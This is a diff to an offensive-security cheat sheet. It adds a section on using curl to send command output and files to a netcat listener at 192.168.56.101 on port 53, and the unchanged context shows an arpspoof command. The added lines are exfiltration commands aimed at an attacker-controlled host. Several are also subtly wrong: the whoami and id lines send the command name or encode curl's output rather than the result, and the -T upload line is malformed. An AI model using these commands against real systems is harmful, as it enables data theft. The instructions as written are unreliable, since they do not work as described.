@@ -50,3 +50,25 @@ We can now spoof the machines we are targetting. One of these machines will be t
 
 `sudo arpspoof -i eth0 -t 172.16.5.1 172.16.5.30`
 
+## curl
+
+We can use *curl* to establish a connection to a remote machine. We will need to use a *netcat* listener on the machine we are connecting to.
+
+`sudo curl http://192.168.56.101:53`
+
+We can send the results of system commands which do not includ blank spaces in their results.
+
+`sudo curl http://192.168.56.101:53/whoami`
+
+If there will be reserved characters in the result, we can *base64* encode the data before sending it.
+
+`sudo curl http://192.168.56.101:53/id|base64`
+
+We can then decode the data.
+
+`echo djKK81jsDT== | base64 -d` | the -d flag specifies decode
+
+We can use *curl* to transfer files using the -T flag.
+
+`sudo curl http://192.168.56.101:53/interesting_file.txt -T /tmp`
+
